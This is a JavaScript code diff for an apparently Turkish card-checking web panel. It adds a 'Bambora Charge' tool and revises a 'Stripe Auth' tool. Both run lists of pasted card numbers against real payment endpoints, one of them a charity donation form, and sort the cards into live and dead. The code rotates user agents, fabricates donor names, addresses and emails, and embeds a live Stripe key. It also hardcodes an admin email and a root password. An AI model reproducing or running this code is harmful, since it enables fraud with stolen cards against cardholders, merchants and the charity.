@@ -35,7 +35,12 @@
         return;
     }
 
-    const isAdmin = session.email === 'apomuhammed1@gmail.com';
+    // ---- ADMIN KONTROLÜ ----
+    let isAdmin = false;
+    if (session.email === 'apomuhammed1@gmail.com') {
+        isAdmin = true;
+    }
+
     const userId = currentUser.userId;
     let displayName = currentUser.displayName || currentUser.email.split('@')[0];
     let userAvatar = currentUser.avatar || '';
@@ -67,6 +72,43 @@
         return max - data.count;
     }
 
+    // ---- RANDOM USER-AGENT ----
+    function getRandomUserAgent() {
+        const agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36'
+        ];
+        return agents[Math.floor(Math.random() * agents.length)];
+    }
+
+    // ---- RANDOM AD, ADRES, MAIL ----
+    function randomName() {
+        const first = ['Ahmet', 'Mehmet', 'Ali', 'Veli', 'Ayse', 'Fatma', 'Zeynep', 'Elif', 'Can', 'Ece', 'Bora', 'Deniz', 'Selin', 'Mert', 'Leyla'];
+        const last = ['Yilmaz', 'Demir', 'Kaya', 'Cinar', 'Celik', 'Kara', 'Aydin', 'Sahin', 'Erdem', 'Kurt', 'Koc', 'Tas', 'Arslan', 'Keskin', 'Ozturk'];
+        return { first: first[Math.floor(Math.random() * first.length)], last: last[Math.floor(Math.random() * last.length)] };
+    }
+
+    function randomAddress() {
+        const streets = ['Ataturk Cad.', 'Istiklal Sok.', 'Cumhuriyet Mah.', 'Bahariye Cad.', 'Bagdat Cad.', 'Abdi Ipekci Cad.', 'Nisantasi Mah.', 'Bebek Sok.'];
+        const cities = ['Istanbul', 'Ankara', 'Izmir', 'Bursa', 'Antalya', 'Konya', 'Adana', 'Gaziantep', 'Mersin', 'Diyarbakir'];
+        const countries = ['Turkey', 'USA', 'UK', 'Germany', 'France', 'Canada', 'Italy', 'Spain'];
+        return {
+            street: streets[Math.floor(Math.random() * streets.length)] + ' ' + (Math.floor(Math.random() * 200) + 1),
+            city: cities[Math.floor(Math.random() * cities.length)],
+            postal: String(Math.floor(Math.random() * 90000) + 10000),
+            country: countries[Math.floor(Math.random() * countries.length)]
+        };
+    }
+
+    function randomEmail() {
+        const domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com', 'protonmail.com'];
+        const name = randomName();
+        return name.first.toLowerCase() + '.' + name.last.toLowerCase() + Math.floor(Math.random() * 1000) + '@' + domains[Math.floor(Math.random() * domains.length)];
+    }
+
     // ---- DOM ----
     const toast = $('toast');
     const toastMessage = $('toastMessage');
@@ -89,6 +131,7 @@
         validator: $('tab-validator'),
         binsorgu: $('tab-binsorgu'),
         stripeauth: $('tab-stripeauth'),
+        bambora: $('tab-bambora'),
         wheel: $('tab-wheel'),
         guess: $('tab-guess'),
         coinflip: $('tab-coinflip'),
@@ -103,6 +146,42 @@
     const adminNavItem = $('adminNavItem');
     const adminLabel = $('adminLabel');
     const adminPanelBtn = $('adminPanelBtn');
+
+    // ---- Toggle'lar ----
+    const toolsToggle = $('toolsToggle');
+    const toolsSub = $('toolsSub');
+    const checkoutToggle = $('checkoutToggle');
+    const checkoutSub = $('checkoutSub');
+    const gamesToggle = $('gamesToggle');
+    const gamesSub = $('gamesSub');
+    const otherToolsToggle = $('otherToolsToggle');
+    const otherToolsSub = $('otherToolsSub');
+
+    if (toolsToggle) {
+        toolsToggle.addEventListener('click', function() {
+            this.classList.toggle('open');
+            toolsSub.classList.toggle('open');
+        });
+    }
+    if (checkoutToggle) {
+        checkoutToggle.addEventListener('click', function(e) {
+            e.stopPropagation();
+            this.classList.toggle('open');
+            checkoutSub.classList.toggle('open');
+        });
+    }
+    if (gamesToggle) {
+        gamesToggle.addEventListener('click', function() {
+            this.classList.toggle('open');
+            gamesSub.classList.toggle('open');
+        });
+    }
+    if (otherToolsToggle) {
+        otherToolsToggle.addEventListener('click', function() {
+            this.classList.toggle('open');
+            otherToolsSub.classList.toggle('open');
+        });
+    }
 
     // ---- RADYO ----
     const songs = ['Dertlimusic.mp3', 'Allahyok.mp3', 'Tamam.mp3', 'Ehlan.mp3', 'Anani.mp3', 'Feryat.mp3', 'Vuruldu.mp3'];
@@ -153,7 +232,7 @@
             isMusicPlaying = true;
             audio.play().catch(() => {});
         }
-        showToast('Previous song', 'info');
+        showToast('Music changed', 'info');
     }
 
     function nextSong() {
@@ -163,7 +242,7 @@
             isMusicPlaying = true;
             audio.play().catch(() => {});
         }
-        showToast('Next song', 'info');
+        showToast('Music changed', 'info');
     }
 
     function updateRadioUI() {
@@ -182,40 +261,31 @@
     if (radioPrev) radioPrev.addEventListener('click', prevSong);
     if (radioNext) radioNext.addEventListener('click', nextSong);
 
-    // ---- Toggle'lar ----
-    const toolsToggle = $('toolsToggle');
-    const toolsSub = $('toolsSub');
-    const checkoutToggle = $('checkoutToggle');
-    const checkoutSub = $('checkoutSub');
-    const gamesToggle = $('gamesToggle');
-    const gamesSub = $('gamesSub');
-    const otherToolsToggle = $('otherToolsToggle');
-    const otherToolsSub = $('otherToolsSub');
-
-    if (toolsToggle) {
-        toolsToggle.addEventListener('click', function() {
-            this.classList.toggle('open');
-            toolsSub.classList.toggle('open');
-        });
-    }
-    if (checkoutToggle) {
-        checkoutToggle.addEventListener('click', function(e) {
-            e.stopPropagation();
-            this.classList.toggle('open');
-            checkoutSub.classList.toggle('open');
-        });
-    }
-    if (gamesToggle) {
-        gamesToggle.addEventListener('click', function() {
-            this.classList.toggle('open');
-            gamesSub.classList.toggle('open');
-        });
-    }
-    if (otherToolsToggle) {
-        otherToolsToggle.addEventListener('click', function() {
-            this.classList.toggle('open');
-            otherToolsSub.classList.toggle('open');
-        });
+    // ---- BIN API ----
+    async function lookupBIN(bin) {
+        try {
+            const response = await fetch('https://bin-api-worker.aninnayem-an.workers.dev/bin/' + bin);
+            if (!response.ok) throw new Error('API error');
+            const data = await response.json();
+            if (data.success && data.data) {
+                const d = data.data;
+                return {
+                    scheme: d.scheme || 'Unknown',
+                    type: d.card_type || 'Unknown',
+                    brand: d.scheme || 'Unknown',
+                    prepaid: d.card_category === 'PREPAID' ? 'Yes' : 'No',
+                    country: d.country || 'Unknown',
+                    countryCode: d.issuer_country || '??',
+                    bank: d.issuer || 'Unknown',
+                    emoji: d.flag || '',
+                    card_category: d.card_category || 'Unknown'
+                };
+            }
+            return null;
+        } catch (e) {
+            console.error('BIN API Error:', e);
+            return null;
+        }
     }
 
     // ---- ONLINE ----
@@ -275,34 +345,18 @@
         return '<i class="fas fa-credit-card logo" style="color:var(--text-muted);"></i>';
     }
 
-    // ---- BIN API ----
-    async function lookupBIN(bin) {
-        try {
-            const response = await fetch('https://bin-api-worker.aninnayem-an.workers.dev/bin/' + bin);
-            if (!response.ok) throw new Error('API error');
-            const data = await response.json();
-            if (data.success && data.data) {
-                const d = data.data;
-                return {
-                    scheme: d.scheme || 'Unknown',
-                    type: d.card_type || 'Unknown',
-                    brand: d.scheme || 'Unknown',
-                    prepaid: d.card_category === 'PREPAID' ? 'Yes' : 'No',
-                    country: d.country || 'Unknown',
-                    countryCode: d.issuer_country || '??',
-                    bank: d.issuer || 'Unknown',
-                    emoji: d.flag || '',
-                    card_category: d.card_category || 'Unknown'
-                };
-            }
-            return null;
-        } catch (e) {
-            console.error('BIN API Error:', e);
-            return null;
-        }
+    function getCardType(card) {
+        const first = card.charAt(0);
+        if (first === '4') return 'Visa';
+        if (first === '5') return 'MasterCard';
+        if (card.startsWith('34') || card.startsWith('37')) return 'Amex';
+        if (card.startsWith('6')) return 'Discover';
+        return 'Visa';
     }
 
-    // ---- STRIPE AUTH (YENİ, DÜZGÜN) ----
+    // ============================================================
+    // STRIPE AUTH (DÜZELTİLDİ)
+    // ============================================================
     function formatCCStripe(line) {
         try {
             const parts = line.split(/[|/,\s]+/).filter(p => p.length > 0);
@@ -324,7 +378,7 @@
 
             const urlCreate = 'https://vibz.stwpower.com/power_bank/api/bankcard/stripe/createSetupIntent?language=ger';
             const headersCreate = {
-                'User-Agent': 'VIBZ/1 CFNetwork/3826.600.41 Darwin/24.6.0',
+                'User-Agent': getRandomUserAgent(),
                 'Content-Type': 'application/json; charset=utf-8',
                 'Accept-Language': 'tr-TR,tr;q=0.9',
                 'Authorization': authToken
@@ -339,7 +393,7 @@
             const textCreate = await respCreate.text();
             const match = textCreate.match(/(seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)/);
             if (!match) {
-                return '❌ Declined! (client_secret not found)';
+                return 'Declined! (client_secret not found)';
             }
             const clientSecret = match[1];
             const intentId = clientSecret.split('_secret_')[0];
@@ -359,7 +413,7 @@
             payload.append('use_stripe_sdk', 'true');
 
             const headersConfirm = {
-                'User-Agent': 'VIBZ/1 CFNetwork/3826.600.41 Darwin/24.6.0',
+                'User-Agent': getRandomUserAgent(),
                 'x-stripe-user-agent': '{"version":"0.37.3","url":"https:\\/\\/github.com\\/stripe\\/stripe-react-native","type":"iPad15,3","lang":"objective-c","name":"@stripe\\/stripe-react-native","bindings_version":"23.27.6","model":"iPad","vendor_identifier":"B0C09781-0D45-4FCD-BCD0-AE0A46B41CDC","os_version":"18.6","partner_id":""}',
                 'stripe-version': '2020-08-27',
                 'authorization': 'Bearer pk_live_51ONMPJCYEondzKCZD7N8xv2rgbCsyLOv2tEYGupao0fdROvY0DrlEZh1gUKuofYPBfD8NK35GGAV6t4OBMjHuIA200FTFfkaiy',
@@ -377,23 +431,34 @@
 
             if (json.error) {
                 const msg = json.error.message || 'Unknown error';
-                return `❌ Declined! (${msg})`;
+                return `Declined! (${msg})`;
             }
 
             const status = json.status;
             if (status === 'succeeded') {
-                return '✅ Approved! (AUTHED)';
+                return 'Approved! (AUTHED)';
             } else if (status === 'requires_action' || status === 'requires_source_action') {
-                return '🔐 3D Secure! (3DS)';
+                return '3D Secure! (3DS)';
             } else {
-                return `❌ Declined! (DEAD)`;
+                return `Declined! (UNKNOWN STATUS - ${status})`;
             }
         } catch (err) {
-            return `❌ Error: ${err.message.slice(0, 50)}`;
+            return `Error: ${err.message.slice(0, 50)}`;
         }
     }
 
     // ---- STRIPE AUTH UI ----
+    const stripeInput = $('stripeInput');
+    const stripePasteBtn = $('stripePasteBtn');
+    const stripeCheckBtn = $('stripeCheckBtn');
+    const stripeResult = $('stripeResult');
+    const liveCount = $('liveCount');
+    const deadCount = $('deadCount');
+    const totalCount = $('totalCount');
+    const liveFilterBtn = $('liveFilterBtn');
+    const deadFilterBtn = $('deadFilterBtn');
+    const allFilterBtn = $('allFilterBtn');
+
     let stripeResults = [];
 
     function renderStripeResults(filter = 'all') {
@@ -427,17 +492,6 @@
         totalCount.textContent = stripeResults.length;
     }
 
-    const stripeInput = $('stripeInput');
-    const stripePasteBtn = $('stripePasteBtn');
-    const stripeCheckBtn = $('stripeCheckBtn');
-    const stripeResult = $('stripeResult');
-    const liveCount = $('liveCount');
-    const deadCount = $('deadCount');
-    const totalCount = $('totalCount');
-    const liveFilterBtn = $('liveFilterBtn');
-    const deadFilterBtn = $('deadFilterBtn');
-    const allFilterBtn = $('allFilterBtn');
-
     if (stripePasteBtn) {
         stripePasteBtn.addEventListener('click', async function() {
             try {
@@ -462,7 +516,6 @@
         });
     }
 
-    // ---- STRIPE CHECK (DÜZGÜN, CHECKING KALKAR) ----
     if (stripeCheckBtn) {
         stripeCheckBtn.addEventListener('click', async function() {
             const lines = stripeInput.value.split('\n').map(l => l.trim()).filter(l => l);
@@ -483,7 +536,7 @@
                 for (const line of lines) {
                     const formatted = formatCCStripe(line);
                     if (!formatted) {
-                        stripeResults.push({ cc: line, mm: '??', yy: '??', cvv: '??', status: '❌ Format Error' });
+                        stripeResults.push({ cc: line, mm: '??', yy: '??', cvv: '??', status: 'Format Error' });
                         continue;
                     }
                     const { cc, mm, yy, cvv } = formatted;
@@ -495,19 +548,12 @@
             } catch (err) {
                 showToast('Error occurred during check.', 'error');
             } finally {
-                // Bakiye düş
                 currentUser.balance -= cost;
                 saveUsers();
                 updateUI();
-
-                // Giriş alanını temizle
                 stripeInput.value = '';
-
-                // Butonu eski haline getir (START BUTONU)
                 this.disabled = false;
-                this.textContent = '▶ Start Check (3 TL/card)';
-
-                // CHECKING YAZISI KALKTI – Sonuçları göster
+                this.textContent = 'Start Check (3 TL/card)';
                 updateStripeCounts();
                 stripeResult.innerHTML = '';
                 renderStripeResults('all');
@@ -531,6 +577,230 @@
         [liveFilterBtn, deadFilterBtn, allFilterBtn].forEach(b => b.classList.remove('active'));
         this.classList.add('active');
         renderStripeResults('all');
+    });
+
+    // ============================================================
+    // BAMBORA CUSTOM CHARGE
+    // ============================================================
+    const bamboraInput = $('bamboraInput');
+    const bamboraAmount = $('bamboraAmount');
+    const bamboraCheckBtn = $('bamboraCheckBtn');
+    const bamboraResult = $('bamboraResult');
+    const bamboraLiveCount = $('bamboraLiveCount');
+    const bamboraDeadCount = $('bamboraDeadCount');
+    const bamboraTotalCount = $('bamboraTotalCount');
+    const bamboraLiveFilter = $('bamboraLiveFilter');
+    const bamboraDeadFilter = $('bamboraDeadFilter');
+    const bamboraAllFilter = $('bamboraAllFilter');
+
+    let bamboraResults = [];
+
+    async function bamboraCharge(card, month, year, cvv, amount) {
+        try {
+            const fullYear = year.length === 2 ? '20' + year : year;
+            const cardType = getCardType(card);
+            const name = randomName();
+            const address = randomAddress();
+            const email = randomEmail();
+
+            // 1. Token al
+            const tokenHeaders = {
+                'Accept': '*/*',
+                'Content-Type': 'text/plain; charset=UTF-8',
+                'Origin': 'https://libs.na.bambora.com',
+                'Referer': 'https://libs.na.bambora.com/',
+                'User-Agent': getRandomUserAgent()
+            };
+
+            const tokenData = JSON.stringify({
+                number: card,
+                expiry_month: month,
+                expiry_year: fullYear,
+                cvd: cvv
+            });
+
+            const tokenResp = await fetch('https://api.na.bambora.com/scripts/tokenization/tokens', {
+                method: 'POST',
+                headers: tokenHeaders,
+                body: tokenData
+            });
+
+            const tokenJson = await tokenResp.json();
+            const token = tokenJson.token || '';
+            if (!token) {
+                return { status: 'Token error', live: false };
+            }
+
+            // 2. Ödeme gönder
+            const formData = new URLSearchParams();
+            formData.append('amount', amount);
+            formData.append('donor_type', 'Personal');
+            formData.append('company', '');
+            formData.append('honour', '');
+            formData.append('supportDedication', '');
+            formData.append('supportDedicationName', '');
+            formData.append('supportCardName_first', '');
+            formData.append('supportCardName_last', '');
+            formData.append('supportCardStreetAddr', '');
+            formData.append('supportCardCity', '');
+            formData.append('supportCardPostalCode', '');
+            formData.append('supportCardCountry', 'Canada');
+            formData.append('supportCardCadProv', '');
+            formData.append('supportCardUsState', '');
+            formData.append('supportCardMessage', '');
+            formData.append('supportDesignation', 'Greatest Need');
+            formData.append('specificCampaign', '');
+            formData.append('card_name', name.first + ' ' + name.last);
+            formData.append('FirstName', name.first);
+            formData.append('LastName', name.last);
+            formData.append('Email', email);
+            formData.append('primaryPhone', '');
+            formData.append('address_lookup', '');
+            formData.append('StreetAddr', address.street);
+            formData.append('City', address.city);
+            formData.append('PostalCode', address.postal);
+            formData.append('country', 'TR');
+            formData.append('CadProv', '');
+            formData.append('UsState', '');
+            formData.append('act', 'pay');
+            formData.append('province', '');
+            formData.append('supportCardProvince', '');
+            formData.append('CreditCardType', cardType);
+            formData.append('token', token);
+            formData.append('GACampaign', 'not set');
+            formData.append('GASource', 'direct');
+            formData.append('GAMedium', 'direct');
+            formData.append('lang_pref', 'undefined');
+            formData.append('bot_check', '');
+            formData.append('language', 'e');
+            formData.append('source_form', '');
+
+            const postHeaders = {
+                'User-Agent': getRandomUserAgent(),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Origin': 'https://donate.kinvia.ca',
+                'Referer': 'https://donate.kinvia.ca/single.php'
+            };
+
+            const postResp = await fetch('https://donate.kinvia.ca/donate.php', {
+                method: 'POST',
+                headers: postHeaders,
+                body: formData
+            });
+
+            const text = await postResp.text();
+
+            // Yanıt analizi
+            if (text.includes('TRANSACTION SUCCESSFUL') || text.includes('Thank you') || text.includes('success')) {
+                return { status: 'Approved!', live: true };
+            } else if (text.includes('TRANSACTION UNSUCCESSFUL') || text.includes('declined') || text.includes('error')) {
+                return { status: 'Declined!', live: false };
+            } else {
+                return { status: 'Unknown response', live: false };
+            }
+
+        } catch (err) {
+            return { status: 'Error: ' + err.message.slice(0, 40), live: false };
+        }
+    }
+
+    function renderBamboraResults(filter = 'all') {
+        let filtered = [];
+        if (filter === 'all') filtered = bamboraResults;
+        else if (filter === 'live') filtered = bamboraResults.filter(r => r.live === true);
+        else if (filter === 'dead') filtered = bamboraResults.filter(r => r.live === false);
+
+        if (!filtered.length) {
+            bamboraResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;">No results.</div>';
+            return;
+        }
+        let html = '';
+        filtered.forEach(r => {
+            const statusColor = r.live ? '#34c759' : '#ff3b30';
+            html += `
+                <div style="padding:4px 0;border-bottom:1px solid var(--border-color);display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;">
+                    <span style="font-family:monospace;">Card: ${r.cc}|${r.mm}|${r.yy}|${r.cvv}</span>
+                    <span style="font-weight:600;color:${statusColor};">Resp: ${r.status}</span>
+                </div>
+            `;
+        });
+        bamboraResult.innerHTML = html;
+    }
+
+    function updateBamboraCounts() {
+        const live = bamboraResults.filter(r => r.live === true).length;
+        const dead = bamboraResults.length - live;
+        bamboraLiveCount.textContent = live;
+        bamboraDeadCount.textContent = dead;
+        bamboraTotalCount.textContent = bamboraResults.length;
+    }
+
+    if (bamboraCheckBtn) {
+        bamboraCheckBtn.addEventListener('click', async function() {
+            const lines = bamboraInput.value.split('\n').map(l => l.trim()).filter(l => l);
+            const amount = parseFloat(bamboraAmount.value);
+            if (!lines.length) { showToast('Enter cards.', 'error'); return; }
+            if (!amount || amount <= 0) { showToast('Enter a valid amount.', 'error'); return; }
+
+            const cost = lines.length * 2;
+            if (currentUser.balance < cost) {
+                showToast(`Insufficient balance! Need ${cost} TL (2 TL/card).`, 'error');
+                return;
+            }
+
+            bamboraResults = [];
+            bamboraResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;font-weight:600;">Checking...</div>';
+            this.disabled = true;
+            this.textContent = 'Checking...';
+
+            try {
+                for (const line of lines) {
+                    const parts = line.split(/[|/,\s]+/).filter(p => p.length > 0);
+                    if (parts.length < 4) {
+                        bamboraResults.push({ cc: line, mm: '??', yy: '??', cvv: '??', status: 'Format Error', live: false });
+                        continue;
+                    }
+                    const cc = parts[0].replace(/\D/g, '');
+                    const mm = parts[1].replace(/\D/g, '').padStart(2, '0').slice(0, 2);
+                    const yy = parts[2].replace(/\D/g, '').slice(0, 2);
+                    const cvv = parts[3].replace(/\D/g, '').slice(0, 4);
+
+                    const result = await bamboraCharge(cc, mm, yy, cvv, amount);
+                    bamboraResults.push({ cc, mm, yy, cvv, status: result.status, live: result.live });
+                    updateBamboraCounts();
+                    renderBamboraResults('all');
+                }
+            } catch (err) {
+                showToast('Error occurred.', 'error');
+            } finally {
+                currentUser.balance -= cost;
+                saveUsers();
+                updateUI();
+                bamboraInput.value = '';
+                this.disabled = false;
+                this.textContent = 'Start Bambora (2 TL/card)';
+                updateBamboraCounts();
+                bamboraResult.innerHTML = '';
+                renderBamboraResults('all');
+                showToast(`Checked ${lines.length} cards. Cost: ${cost} TL deducted.`, 'success');
+            }
+        });
+    }
+
+    if (bamboraLiveFilter) bamboraLiveFilter.addEventListener('click', function() {
+        [bamboraLiveFilter, bamboraDeadFilter, bamboraAllFilter].forEach(b => b.classList.remove('active'));
+        this.classList.add('active');
+        renderBamboraResults('live');
+    });
+    if (bamboraDeadFilter) bamboraDeadFilter.addEventListener('click', function() {
+        [bamboraLiveFilter, bamboraDeadFilter, bamboraAllFilter].forEach(b => b.classList.remove('active'));
+        this.classList.add('active');
+        renderBamboraResults('dead');
+    });
+    if (bamboraAllFilter) bamboraAllFilter.addEventListener('click', function() {
+        [bamboraLiveFilter, bamboraDeadFilter, bamboraAllFilter].forEach(b => b.classList.remove('active'));
+        this.classList.add('active');
+        renderBamboraResults('all');
     });
 
     // ---- UI ----
@@ -558,18 +828,17 @@
         if (userBioInput) userBioInput.value = userBio || '';
         if (themeSelect) themeSelect.value = document.documentElement.getAttribute('data-theme') || 'light';
 
-        // Admin panel butonu
+        const isRealAdmin = session.email === 'apomuhammed1@gmail.com';
         if (adminPanelBtn) {
-            adminPanelBtn.style.display = isAdmin ? 'flex' : 'none';
+            adminPanelBtn.style.display = isRealAdmin ? 'flex' : 'none';
         }
         if (adminNavItem) {
-            adminNavItem.style.display = isAdmin ? 'flex' : 'none';
+            adminNavItem.style.display = isRealAdmin ? 'flex' : 'none';
         }
         if (adminLabel) {
-            adminLabel.style.display = isAdmin ? 'block' : 'none';
+            adminLabel.style.display = isRealAdmin ? 'block' : 'none';
         }
 
-        // Oyun hakları
         if (spinUsed) {
             const spinData = getGameLimit('spin', 1);
             spinUsed.textContent = spinData.count >= 1 ? 0 : 1;
@@ -584,7 +853,6 @@
         updateOnline();
     }
 
-    // ---- SAVE ----
     function saveUsers() {
         localStorage.setItem('ccUsers', JSON.stringify(users));
     }
@@ -603,7 +871,7 @@
         navItems.forEach(item => { if (item) item.classList.toggle('active', item.dataset.tab === tabId); });
         updatePageTitle(tabId);
         if (tabId === 'dashboard') updateUI();
-        if (tabId === 'admin' && isAdmin) {
+        if (tabId === 'admin' && session.email === 'apomuhammed1@gmail.com') {
             if (adminLock) { adminLock.style.display = 'block';
                 adminContent.style.display = 'none';
                 adminLockError.style.display = 'none';
@@ -618,6 +886,12 @@
             [liveFilterBtn, deadFilterBtn, allFilterBtn].forEach(b => b.classList.remove('active'));
             if (allFilterBtn) allFilterBtn.classList.add('active');
         }
+        if (tabId === 'bambora') {
+            updateBamboraCounts();
+            renderBamboraResults('all');
+            [bamboraLiveFilter, bamboraDeadFilter, bamboraAllFilter].forEach(b => b.classList.remove('active'));
+            if (bamboraAllFilter) bamboraAllFilter.classList.add('active');
+        }
         closeSidebar();
     }
 
@@ -628,6 +902,7 @@
             validator: { title: 'CC Validator', sub: 'Card validation' },
             binsorgu: { title: 'BIN Lookup', sub: 'BIN information' },
             stripeauth: { title: 'Stripe Auth', sub: 'Card authorization' },
+            bambora: { title: 'Bambora Charge', sub: 'Custom amount charge' },
             wheel: { title: 'Spin Wheel', sub: 'Daily free spin!' },
             guess: { title: 'Guess Number', sub: 'Guess 1-100' },
             coinflip: { title: 'Coin Flip', sub: 'Try your luck' },
@@ -674,7 +949,7 @@
             for (let i = 0; i < count; i++) {
                 let card = generateCC(bin, 16);
                 const isValid = luhnCheck(card);
-                const status = isValid ? '✅' : '❌';
+                const status = isValid ? 'Valid' : 'Invalid';
                 const statusColor = isValid ? '#34c759' : '#ff3b30';
                 html += `<div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--border-color);font-family:monospace;">
                     <span>${card}|${month}|${year}|${cvv}</span>
@@ -687,7 +962,6 @@
         });
     }
 
-    // ---- COPY ALL ----
     if (copyAllBtn) {
         copyAllBtn.addEventListener('click', function() {
             const items = ccList.querySelectorAll('div > span:first-child');
@@ -976,7 +1250,7 @@
         aiMessagesData.push({ sender: displayName, text, time: Date.now() });
         const response = getAIResponse(text);
         setTimeout(() => {
-            aiMessagesData.push({ sender: 'Zenit', text: response, time: Date.now() });
+            aiMessagesData.push({ sender: 'Zenit 🤖', text: response, time: Date.now() });
             saveAIMessages();
             renderAIMessages();
         }, 300 + Math.random() * 700);
@@ -993,6 +1267,7 @@
     const spinResult = $('wheelResult');
     const spinUsed = $('spinUsed');
     const wheelCanvas = $('wheelCanvas');
+
     let wheelSegments = [
         { label: '5 TL', value: 5, color: '#ff6b6b' },
         { label: '15 TL', value: 15, color: '#ffd93d' },
@@ -1187,7 +1462,7 @@
                 currentUser.balance += 5;
                 saveUsers();
                 updateUI();
-                diceStatus.textContent = `You rolled 6! You won 5 TL!`;
+                diceStatus.textContent = 'You rolled 6! You won 5 TL!';
                 showToast('You won 5 TL!', 'success');
             } else {
                 diceStatus.textContent = `You rolled ${value}. You lost.`;
@@ -1228,10 +1503,10 @@
             currentUser.balance += 5;
             saveUsers();
             updateUI();
-            rpsStatus.textContent = `You won! 5 TL earned!`;
+            rpsStatus.textContent = 'You won! 5 TL earned!';
             showToast('You won 5 TL!', 'success');
         } else {
-            rpsStatus.textContent = `You lost.`;
+            rpsStatus.textContent = 'You lost.';
         }
         if (rpsRemain) rpsRemain.textContent = getGameRemain('rps', 4);
     }
@@ -1304,6 +1579,7 @@
     const banList = $('banList');
     const newKeyDisplay = $('newKeyDisplay');
     const generateKeyBtn = $('generateKeyBtn');
+
     let adminAttempts = 0;
     let adminLockedUntil = 0;
     const rootPassword = 'root2025';
@@ -1399,7 +1675,7 @@
     }
 
     function renderAdminPanel() {
-        if (!isAdmin || !userList) return;
+        if (session.email !== 'apomuhammed1@gmail.com' || !userList) return;
         const ul = userList;
         ul.innerHTML = '';
         users.forEach(u => {
@@ -1470,7 +1746,7 @@
 
     if (generateKeyBtn) {
         generateKeyBtn.addEventListener('click', function() {
-            if (!isAdmin) { showToast('Access denied.', 'error'); return; }
+            if (session.email !== 'apomuhammed1@gmail.com') { showToast('Access denied.', 'error'); return; }
             const key = Math.random().toString(36).substring(2, 10).toUpperCase();
             registrationKeys.push(key);
             localStorage.setItem('registrationKeys', JSON.stringify(registrationKeys));
@@ -1525,7 +1801,7 @@
         item.addEventListener('click', function() {
             const tab = this.dataset.tab;
             if (!tab) return;
-            if (tab === 'admin' && !isAdmin) { showToast('Admin access required.', 'error'); return; }
+            if (tab === 'admin' && session.email !== 'apomuhammed1@gmail.com') { showToast('Admin access required.', 'error'); return; }
             switchTab(tab);
         });
     });
@@ -1541,7 +1817,7 @@
     updateSession();
     updateUI();
 
-    if (isAdmin) {
+    if (session.email === 'apomuhammed1@gmail.com') {
         if (adminLock) adminLock.style.display = 'block';
         if (adminContent) adminContent.style.display = 'none';
     }
